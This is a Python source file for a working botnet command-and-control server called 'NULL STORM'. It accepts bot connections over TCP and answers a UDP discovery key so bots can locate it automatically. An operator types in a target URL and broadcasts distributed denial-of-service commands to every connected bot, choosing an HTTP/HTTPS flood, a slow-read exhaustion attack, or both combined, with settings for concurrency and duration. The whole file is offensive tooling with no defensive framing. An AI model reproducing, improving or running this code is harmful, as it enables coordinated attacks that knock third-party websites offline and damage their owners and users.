import socket
import threading
import time
import sys
from banner import show_banner
import config

bots = []
running = True

def safe_print(text):
    """Print tanpa numpuk prompt input"""
    sys.stdout.write("\r" + " " * 80 + "\r")
    sys.stdout.write(text + "\n")
    sys.stdout.write("Enter target URL (http:// or https://): ")
    sys.stdout.flush()

def handle_bot(conn, addr):
    global bots
    bots.append(conn)
    safe_print(f"[+] Bot connected: {addr[0]}:{addr[1]} | Total: {len(bots)}")
    while running:
        try:
            data = conn.recv(4096)
            if not data:
                break
            msg = data.decode().strip()
            if msg == "ATTACK_STARTED":
                safe_print(f"[*] Bot {addr[0]} attack started.")
            elif msg == "ATTACK_FINISHED":
                safe_print(f"[*] Bot {addr[0]} attack finished.")
            elif msg.startswith("STATUS:"):
                safe_print(f"[*] Bot {addr[0]} status: {msg[7:]}")
        except:
            break
    if conn in bots:
        bots.remove(conn)
    safe_print(f"[-] Bot disconnected: {addr[0]}:{addr[1]} | Total: {len(bots)}")
    conn.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", config.C2_PORT))
    server.listen(500)
    safe_print(f"[NULL STORM] C2 Server ONLINE on port {config.C2_PORT}")
    while running:
        try:
            server.settimeout(1)
            conn, addr = server.accept()
            threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
        except socket.timeout:
            continue
        except:
            break
    server.close()

def start_discovery_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.bind(("0.0.0.0", config.C2_DISCOVERY_PORT))
    sock.settimeout(1)
    safe_print(f"[NULL STORM] Auto-Discovery UDP ON port {config.C2_DISCOVERY_PORT}")
    safe_print(f"[NULL STORM] Bots will find this C2 automatically!")
    while running:
        try:
            data, addr = sock.recvfrom(1024)
            if data.decode().strip() == config.C2_DISCOVERY_KEY:
                sock.sendto(config.C2_DISCOVERY_RESPONSE.encode(), addr)
        except socket.timeout:
            continue
        except:
            break
    sock.close()

def broadcast(cmd):
    dead = []
    for bot in bots:
        try:
            bot.send(cmd.encode())
        except:
            dead.append(bot)
    for d in dead:
        if d in bots:
            bots.remove(d)

def commander():
    global running
    while running:
        try:
            print()
            target = input("Enter target URL (http:// or https://): ").strip()
            
            if target.lower() == "exit":
                running = False
                break
            if target.lower() == "list":
                print(f"\n[NULL STORM] Bots online: {len(bots)}")
                for i, bot in enumerate(bots):
                    try:
                        print(f"  {i+1}. {bot.getpeername()}")
                    except:
                        print(f"  {i+1}. (disconnected)")
                print()
                continue
            if target.lower() == "banner":
                show_banner()
                continue
            if target.lower() == "help":
                print("\nCommands:")
                print("  list   - Show online bots")
                print("  banner - Show banner")
                print("  exit   - Shutdown C2")
                print("  <url>  - Attack target\n")
                continue
            if not target.startswith("http://") and not target.startswith("https://"):
                print("[!] Must start with http:// or https://")
                continue

            print("\nSelect attack mode:")
            print("1. APOCALYPSE (HTTP/HTTPS hybrid flood)")
            print("2. SLOWREAD  (Slow read exhaustion)")
            print("3. COMBINED   (Both at once)")
            mode = input("Mode (1/2/3): ").strip()

            if mode == "1":
                conc = input("Concurrency (default 2000): ").strip() or "2000"
                dur = input("Duration seconds (default 180): ").strip() or "180"
                cmd = f"APOCALYPSE {target} {conc} {dur}"
                broadcast(cmd)
                print(f"\n[NULL STORM] ApocalypseFlood sent to {len(bots)} bots!")

            elif mode == "2":
                port = input("Port (default 80): ").strip() or "80"
                conns = input("Connections (default 1000): ").strip() or "1000"
                dur = input("Duration seconds (default 180): ").strip() or "180"
                cmd = f"SLOWREAD {target} {port} {conns} {dur}"
                broadcast(cmd)
                print(f"\n[NULL STORM] SlowRead sent to {len(bots)} bots!")

            elif mode == "3":
                conc = input("Apocalypse concurrency (default 2000): ").strip() or "2000"
                dur = input("Duration seconds (default 120): ").strip() or "120"
                port = input("SlowRead port (default 80): ").strip() or "80"
                conns = input("SlowRead connections (default 1000): ").strip() or "1000"
                broadcast(f"APOCALYPSE {target} {conc} {dur}")
                broadcast(f"SLOWREAD {target} {port} {conns} {dur}")
                print(f"\n[NULL STORM] COMBINED attack sent to {len(bots)} bots!")

        except KeyboardInterrupt:
            running = False
            break
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    show_banner()
    print("[*] Starting C2 with Auto-Discovery...")
    threading.Thread(target=start_discovery_server, daemon=True).start()
    threading.Thread(target=start_server, daemon=True).start()
    time.sleep(2)
    commander()
    print("\n[NULL STORM] C2 Shutting down...")